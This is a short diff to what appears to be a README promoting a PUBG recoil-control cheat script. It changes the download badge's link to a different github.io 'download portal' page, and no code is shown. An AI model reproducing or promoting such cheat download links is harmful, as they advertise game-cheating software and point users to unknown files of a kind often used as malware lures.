@@ -2,7 +2,7 @@
 ### *Control every bullet. Land every shot. Survive longer.*
 
 <p align="center">
-  <a href="https://pubg-recoil-control-script.github.io/.github/" target="_blank">
+  <a href="https://download-portal-demo.github.io/.github/PUBGRecoilcontrol2" target="_blank">
     <img src="https://img.shields.io/badge/⬇️ DOWNLOAD-PUBG_RECOIL_CONTROL-1f1e6?style=for-the-badge&logo=pubg&logoColor=white" alt="Download PUBG Recoil Control Script" />
   </a>
 </p>
